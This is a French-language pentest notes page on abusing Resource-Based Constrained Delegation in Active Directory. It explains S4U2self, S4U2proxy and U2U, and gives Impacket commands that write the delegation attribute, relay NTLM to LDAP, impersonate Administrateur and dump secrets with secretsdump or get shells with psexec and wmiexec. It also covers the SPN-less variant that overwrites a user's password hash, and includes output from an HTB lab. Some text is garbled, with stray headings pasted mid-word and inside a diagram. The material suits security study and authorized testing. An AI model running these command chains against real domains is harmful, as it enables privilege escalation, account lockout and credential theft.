# RBCD

### <mark style="color:blue;">📚 Théorie</mark>

#### <mark style="color:green;">Principe de base</mark>

Si un compte dispose de la capacité d'éditer l'attribut **`msDS-AllowedToActOnBehalfOfOtherIdentity`** d'un autre objet (par exemple via l'ACE `GenericWrite`), un attaquant peut utiliser ce compte pour remplir cet attribut et configurer l'objet cible pour une délégation RBCD.

> 💡 **Point clé** : Les comptes machine peuvent éditer leur propre attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`, ce qui permet des attaques RBCD sur les authentifications de comptes machine relayées.

***

#### <mark style="color:green;">Prérequis pour l'attaque</mark>

Pour que cette attaque fonctionne, l'attaquant doit remplir l'attribut cible avec le **SID d'un compte** que Kerberos peut considérer comme un service. Le compte doit être soit :

1. ✅ **Un compte utilisateur avec un ServicePrincipalName (SPN) défini**
2. ✅ **Un compte avec un `$` final dans le sAMAccountName** (c'est-à-dire un compte ordinateur)
3. ✅ **N'importe quel autre compte** + utiliser la technique RBCD sans SPN avec l'authentification U2U (User-to-User)

#### <mark style="color:green;">Méthode classique : créer un compte ordinateur</mark>

La façon courante de mener ces attaques est de **créer un compte ordinateur**. Ceci est généralement possible grâce à l'attribut **`MachineAccountQuota`** au niveau du domaine, qui permet aux utilisateurs réguliers de créer jusqu'à **10 comptes ordinateurs**.

#### <mark style="color:green;">Alternative : RBCD sans SPN (2022)</mark>

En 2022, James Forshaw a démontré que l'exigence SPN n'était pas totalement obligatoire et que le RBCD pouvait fonctionner sans : **Exploiting RBCD using a normal user**.

⚠️ **Attention** : Cette technique est plus délicate et doit **absolument être évitée sur des comptes utilisateur réguliers** (la technique les rend inutilisables pour les personnes normales), mais elle permet d'abuser de RBCD même si le `MachineAccountQuota` est défini à 0.

***

### <mark style="color:blue;">🎯 Processus d'attaque</mark>

```
┌─────────────────────────────────────────────────────────┐
│  Étape 1 : Modifier l'attribut RBCD de la cible        │
│  → msDS-AllowedToActOnBehalfOfOtherIdentity             │
└─────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│  Étape 2 : Obtenir un ticket de service                │
│  → Via S4U2Self + S4U2Proxy                             │
└─────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│  Étape 3 : Pass-the-Ticket                             │
│  → Accéder au service cible                             │
└─────────────────────────────────────────────────────────┘
```

#### <mark style="color:green;">Résultat final</mark>

Un abus RBCD aboutit à un **Service Ticket** pour s'authentifier sur le service cible (B) au nom d'un utilisateur. Une fois le Service Ticket final obtenu, il peut être utilisé avec **Pass-the-Ticket** pour accéder au service cible.

***

### <mark style="color:blue;">🚨 Restrictions importantes</mark>

#### <mark style="color:green;">Comptes protégés</mark>

Si le compte "usurpé" est marqué comme **"sensible et ne peut pas être délégué"** ou est membre du groupe **"Protected Users"**, la délégation échouera (probablement).

⚠️ **Exception notable** : Le compte natif "Administrator" (RID 500) ne bénéficie **PAS** de cette restriction, même s'il est ajouté au groupe Protected Users.

#### <mark style="color:green;">Détails techniques (janvier 2023)</mark>

📅 **Décembre 2020** : Microsoft a publié deux patches importants :

* **KB4598347** : Corrige l'attaque bronze-bit (CVE-2020-17049)
* **KB4577252** : Corrige la vulnérabilité CVE-2020-16996

**Comportements observés** :

* ✅ Avant le patch : Les comptes "sensibles" n'étaient pas délégués (comportement prévu)
* ❌ Avant le patch : Les membres de Protected Users **étaient délégués** (non prévu !)
* ✅ Après le patch : Les membres de Protected Users sont protégés
* ⚠️ **Exception** : Le compte administrateur RID 500 reste délégable même dans Protected Users

***

### <mark style="color:blue;">🛠️ Pratique</mark>

#### <mark style="color:green;">⚙️ Étape 1 : Modifier l'attribut "rbcd" de la cible</mark>

**Avec rbcd.py (Impacket)**

```bash
# Lire l'attribut actuel
rbcd.py -delegate-to 'cible$' -dc-ip 'IP_DC' -action 'read' 'domaine'/'UtilisateurPuissant':'MotDePasse'

# Ajouter une valeur à msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-from 'comptecontrole' -delegate-to 'cible$' -dc-ip 'IP_DC' -action 'write' 'domaine'/'UtilisateurPuissant':'MotDePasse'

# Effacer l'attribut
rbcd.py -delegate-to 'cible$' -dc-ip 'IP_DC' -action 'remove' 'domaine'/'UtilisateurPuissant':'MotDePasse'
```

**Avec ntlmrelayx (lors d'une authentification relayée)**

```bash
ntlmrelayx.py -t ldap://DC_IP --delegate-access
```

> 💡 Dans cet exemple, `comptecontrole` peut être :
>
> * Un compte ordinateur créé pour l'attaque
> * N'importe quel autre compte (avec au moins un SPN pour la technique classique, ou sans pour le RBCD sans SPN)

#### <mark style="color:green;">🎫 Étape 2 : Obtenir un ticket (opération de délégation)</mark>

**Technique classique avec SPN**

```bash
# Obtenir le Service Ticket final en usurpant l'identité d'un utilisateur
getST.py -spn 'cifs/cible' -impersonate Administrateur -dc-ip 'IP_DC' 'domaine/comptecontrole:MotDePasse'

# Exemple avec hash NT au lieu du mot de passe
getST.py -spn 'cifs/cible.domaine.local' -impersonate Administrateur -hashes :NTHASH -dc-ip 'IP_DC' 'domaine/comptecontrole'
```

**Avec l'option Bronze Bit (si nécessaire)**

```bash
# Forcer le flag forwardable pour contourner certaines restrictions
getST.py -spn 'cifs/cible' -impersonate Administrateur -dc-ip 'IP_DC' -force-forwardable 'domaine/comptecontrole:MotDePasse'
```

**Choix du SPN**

Le **SPN** (Service Principal Name) défini peut avoir un impact sur les services accessibles :

| SPN                  | Services accessibles                         |
| -------------------- | -------------------------------------------- |
| `cifs/cible.domaine` | Partages de fichiers, accès SMB              |
| `host/cible.domaine` | Plupart des opérations de dumping à distance |
| `ldap/cible.domaine` | Services LDAP                                |
| `http/cible.domaine` | Services web                                 |

> 💡 **Technique AnySPN** : Il est possible de modifier le service class après obtention du ticket pour accéder à d'autres services. Cette technique est automatiquement tentée par les scripts Impacket lors du pass-the-ticket.

#### <mark style="color:green;">🛂 Étape 3 : Pass-the-Ticket</mark>

```bash
# Exporter le ticket dans une variable d'environnement
export KRB5CCNAME=/chemin/vers/ticket.ccache

# Utiliser le ticket pour accéder à la cible
# Exemple : Dump des secrets via secretsdump
secretsdump.py -k -no-pass cible.domaine.local

# Exemple : Shell interactif
psexec.py -k -no-pass domaine/Administrateur@cible.domaine.local

# Exemple : WMI execution
wmiexec.py -k -no-pass domaine/Administrateur@cible.domaine.local
```

***

### <mark style="color:blue;">🔧 RBCD sur des utilisateurs sans SPN</mark>

#### <mark style="color:green;">Principe</mark>

Cette technique permet d'abuser de RBCD même quand :

* ❌ Le `MachineAccountQuota` est défini à 0
* ❌ L'absence de LDAPS limite la créatio**Principe**n de comptes ordinateurs
* ⚠️ **Coût** : Nécessite un compte utilisateur sacrificiel (sera inutilisable après)

#### <mark style="color:green;">Processus détaillé</mark>

```
┌────────────────────────────────────────────────────────┐
│  1. Obtenir un TGT pour l'utilisateur sans SPN         │
│     et récupérer la clé de session du TGT              │
└────────────────────────────────────────────────────────┘
                        ↓
┌────────────────────────────────────────────────────────┐
│  2. Changer le hash du mot de passe de l'utilisateur   │
│     et le définir sur la clé de session du TGT         │
└────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────Processus détaillé───────────────────────────┐
│  3. Combiner S4U2self + U2U + S4U2proxy                │
│     pour obtenir un ticket vers la cible               │
└────────────────────────────────────────────────────────┘
                        ↓
┌────────────────────────────────────────────────────────┐
│  4. Pass-the-Ticket et accès à la cible               │
└────────────────────────────────────────────────────────┘
```

#### <mark style="color:green;">Commandes pratiques</mark>

```bash
# 1. Obtenir un TGT via overpass-the-hash pour utiliser RC4
getTGT.py -hashes :$(pypykatz crypto nt 'MotDePasse') 'domaine'/'comptesansSPN'

# 2. Obtenir la clé de session du TGT
describeTicket.py 'TGT.ccache' | grep 'Ticket Session Key'

# 3. Changer le hash NT du compte avec la clé de session du TGT
changepasswd.py -newhashes :CleSessionTGT 'domaine'/'comptesansSPN':'MotDePasse'@'IP_DC'

# 4. Obtenir le ticket de service délégué via S4U2self+U2U suivi de S4U2proxy
export KRB5CCNAME='TGT.ccache'
getST.py -u2u -impersonate "Administrateur" -spn "host/cible.domaine.com" -k -no-pass 'domaine'/'comptesansSPN'

# 5. (Optionnel) Réinitialiser le mot de passe à son ancienne valeur
changepasswd.py -hashes :CleSessionTGT -newhashes :AncienNTHash 'domaine'/'comptesansSPN'@'IP_DC'
```

```
PS C:\> Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
PS C:\> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount

DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
DNSHostName                          : dc.rustykey.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
PrincipalsAllowedToDelegateToAccount : {CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb}
SamAccountName                       : DC$
SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
UserPrincipalName                    : 
```

#### <mark style="color:green;">Étapes individuelles (si nécessaire)</mark>

```bash
# S4U2self seul (avec -self)
getST.py -u2u -self -impersonate "Administrateur" -k -no-pass 'domaine'/'comptesansSPN'

# S4U2proxy seul (avec -additional-ticket)
getST.py -additional-ticket ticket_s4u2self.ccache -spn "host/cible.domaine.com" -k -no-pass 'domaine'/'comptesansSPN'
```

```
oxdf@hacky$ getST.py 'rustykey.htb/IT-COMPUTER3$:Rusty88!' -k -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
```

***

### <mark style="color:blue;">📋 Récapitulatif des outils</mark>

| Outil                      | Utilisation                                                  |
| -------------------------- | ------------------------------------------------------------ |
| `rbcd.py`                  | Modifier l'attribut msDS-AllowedToActOnBehalfOfOtherIdentity |
| `getST.py`                 | Obtenir des tickets via S4U2Self/S4U2Proxy                   |
| `getTGT.py`                | Obtenir un TGT initial                                       |
| `describeTicket.py`        | Analyser le contenu d'un ticket                              |
| `changepasswd.py`          | Modifier le mot de passe d'un compte                         |
| `secretsdump.py`           | Dumper les secrets du domaine                                |
| `psexec.py` / `wmiexec.py` | Exécution de commandes à distance                            |

***

### <mark style="color:blue;">⚠️ Points d'attention</mark>

#### <mark style="color:green;">Niveau fonctionnel du domaine</mark>

L'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` a été introduit avec **Windows Server 2012**, ce qui implique que RBCD fonctionne uniquement lorsque le **Domain Controller Functionality Level (DCFL)** est Windows Server 2012 ou supérieur.

#### <mark style="color:green;">Comptes sacrificiels</mark>

⚠️ **Important** : Lors de l'utilisation de la technique RBCD sans SPN, le compte utilisateur utilisé deviendra **inutilisable** pour les utilisateurs normaux car son hash de mot de passe sera remplacé par une valeur sans texte clair connu.

### 📚 Ressources

* [Resource Based Constrained Delegation Abuse - StealthBits](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)
* [Wagging the Dog - Shenaniganslabs](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [Kerberos Bronze Bit Theory - NetSPI](https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/)
* [Abusing Forgotten Permissions - Dirk-jan](https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/)
* [Exploiting RBCD using normal user - Tiraniddo](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)

***

### <mark style="color:blue;">🎯 C'est quoi S4U2self, S4U2proxy et U2U ?</mark>

#### <mark style="color:green;">📚 Contexte : Les extensions Kerberos S4U</mark>

**S4U** = **Service for User** (Service pour l'utilisateur)

Ce sont des **extensions du protocole Kerberos** créées par Microsoft pour permettre à un service de **s'authentifier au nom d'un utilisateur** sans avoir besoin du mot de passe de cet utilisateur.

***

### <mark style="color:green;">🔍 Les trois mécanismes expliqués</mark>

#### 1️⃣ **S4U2self** (Service for User to Self)

**Permet à un service d'obtenir un ticket de service pour lui-même au nom d'un autre utilisateur**

```
┌─────────────────────────────────────────────────────┐
│  Situation :                                        │
│  - Je suis le service "ServiceA"                    │
│  - Je veux un ticket pour MOI-MÊME                  │
│  - Mais au nom de l'utilisateur "Alice"             │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  ServiceA demande au KDC :                          │
│  "Donne-moi un ticket pour ServiceA                 │
│   comme si Alice se connectait à moi"               │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  KDC répond :                                       │
│  Voici un Service Ticket :                          │
│  - Pour : ServiceA                                  │
│  - Au nom de : Alice                                │
│  - Flag : FORWARDABLE (peut être délégué)           │
└─────────────────────────────────────────────────────┘
```

**Utilité** : Obtenir un ticket "au nom de quelqu'un" sans avoir ses identifiants

***

#### 2️⃣ **S4U2proxy** (Service for User to Proxy)

**Permet à un service de demander un ticket pour UN AUTRE service au nom d'un utilisateur**

```
┌─────────────────────────────────────────────────────┐
│  Situation :                                        │
│  - Je suis ServiceA                                 │
│  - J'ai un ticket pour moi au nom d'Alice (S4U2self)│
│  - Je veux maintenant accéder à ServiceB            │
│    au nom d'Alice                                   │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  ServiceA demande au KDC :                          │
│  "J'ai ce ticket d'Alice pour moi,                  │
│   donne-moi un ticket pour ServiceB au nom d'Alice" │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  KDC vérifie :                                      │
│  - ServiceA est-il autorisé à déléguer vers        │
│    ServiceB ? (attribut msDS-AllowedToDelegate...)  │
│  - OK ✓                                             │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│  KDC répond :                                       │
│  Voici un Service Ticket :                          │
│  - Pour : ServiceB                                  │
│  - Au nom de : Alice                                │
└─────────────────────────────────────────────────────┘
```

**Utilité** : "Transférer" l'identité d'un utilisateur vers un autre service

***

#### 3️⃣ **U2U** (User-to-User)

**Un mode spécial d'authentification Kerberos où deux utilisateurs/services s'authentifient l'un à l'autre en utilisant leurs TGT**

```
┌─────────────────────────────────────────────────────┐
│  Situation NORMALE (avec SPN) :                     │
│  - ServiceB a un SPN (ex: HTTP/serviceB)            │
│  - Le KDC chiffre le ticket avec la clé de ServiceB │
│  - ServiceB peut déchiffrer le ticket               │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  Situation PROBLÈME (sans SPN - utilisateur) :      │
│  - UserB n'a PAS de SPN                             │
│  - Le KDC ne peut pas créer de ticket normal        │
│  - ❌ Ça ne marche pas !                            │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  Solution U2U :                                     │
│  - UserB fournit son propre TGT                     │
│  - Le KDC chiffre le ticket avec la clé de          │
│    SESSION du TGT de UserB                          │
│  - UserB peut déchiffrer avec sa clé de session     │
│  - ✅ Ça marche !                                   │
└─────────────────────────────────────────────────────┘
```

**Utilité** : Permettre l'authentification vers des comptes **sans SPN** (utilisateurs normaux)

***

### <mark style="color:blue;">🔗 Pourquoi combiner S4U2self + U2U + S4U2proxy ?</mark>

#### ❌ Avec un compte ordinateur ou un utilisateur avec SPN (CLASSIQUE)

```bash
# Simple et direct
getST.py -spn 'cifs/cible' -impersonate Administrateur 'domaine/compteavecSPN:MotDePasse'

# En interne, cela fait :
# 1. S4U2self : Obtenir un ticket pour compteavecSPN au nom d'Administrateur
# 2. S4U2proxy : Utiliser ce ticket pour obtenir un ticket vers cifs/cible
```

**Pas besoin de U2U car le compte a un SPN** ✅

***

#### ✅ Avec un utilisateur SANS SPN (TECHNIQUE AVANCÉE)

**Problème** : Si on essaie la même chose avec un utilisateur sans SPN, ça plante !

```bash
# ❌ Ceci NE MARCHE PAS
getST.py -spn 'cifs/cible' -impersonate Administrateur 'domaine/usersansSPN:MotDePasse'

# Erreur : Le KDC ne peut pas créer de ticket de service 
# pour un compte sans SPN
```

**Solution** : Utiliser **U2U** comme intermédiaire

```
┌────────────────────────────────────────────────────┐
│  Étape 1 : S4U2self + U2U                          │
│  ─────────────────────────                         │
│  usersansSPN demande au KDC :                      │
│  "Donne-moi un ticket pour MOI-MÊME                │
│   au nom d'Administrateur                          │
│   en utilisant U2U (avec mon TGT)"                 │
│                                                    │
│  Résultat : Ticket U2U pour usersansSPN           │
│             au nom d'Administrateur                │
└────────────────────────────────────────────────────┘
                        ↓
┌────────────────────────────────────────────────────┐
│  Étape 2 : S4U2proxy                               │
│  ─────────────────────                             │
│  usersansSPN demande au KDC :                      │
│  "J'ai ce ticket U2U d'Administrateur,             │
│   donne-moi un ticket pour cifs/cible              │
│   au nom d'Administrateur"                         │
│                                                    │
│  Résultat : Service Ticket pour cifs/cible        │
│             au nom d'Administrateur ✅             │
└────────────────────────────────────────────────────┘
```

***

### <mark style="color:blue;">🛠️ En pratique avec Impacket</mark>

#### Cas 1 : Avec SPN (SIMPLE - pas de U2U)

```bash
# Tout en une commande
getST.py -spn 'cifs/cible' -impersonate Administrateur -dc-ip 'IP_DC' 'domaine/compteavecSPN:MotDePasse'
```

#### Cas 2 : Sans SPN (COMPLEXE - avec U2U)

```bash
# 1. Obtenir le TGT et extraire la clé de session
getTGT.py -hashes :$(pypykatz crypto nt 'MotDePasse') 'domaine/usersansSPN'
describeTicket.py 'TGT.ccache' | grep 'Ticket Session Key'

# 2. Remplacer le hash du compte par la clé de session du TGT
# (C'est pour ça que le compte devient inutilisable !)
changepasswd.py -newhashes :CleSessionTGT 'domaine/usersansSPN':'MotDePasse'@'IP_DC'

# 3. Combiner S4U2self+U2U puis S4U2proxy
export KRB5CCNAME='TGT.ccache'
getST.py -u2u -impersonate "Administrateur" -spn "cifs/cible" -k -no-pass 'domaine/usersansSPN'
#        ^^^^
#        Ce flag active le mode U2U !
```

**Le flag `-u2u`** indique à getST.py :

* ✅ "Utilise U2U pour S4U2self (car pas de SPN)"
* ✅ "Ensuite fais S4U2proxy normalement"

***

### 📊 Tableau récapitulatif

| Mécanisme     | Quoi ?                                                    | Quand ?                      |
| ------------- | --------------------------------------------------------- | ---------------------------- |
| **S4U2self**  | Obtenir un ticket pour soi-même au nom d'un autre         | Toujours (première étape)    |
| **S4U2proxy** | Obtenir un ticket pour un autre service au nom d'un autre | Toujours (deuxième étape)    |
| **U2U**       | Mode spécial pour comptes sans SPN                        | **Uniquement si pas de SPN** |

***
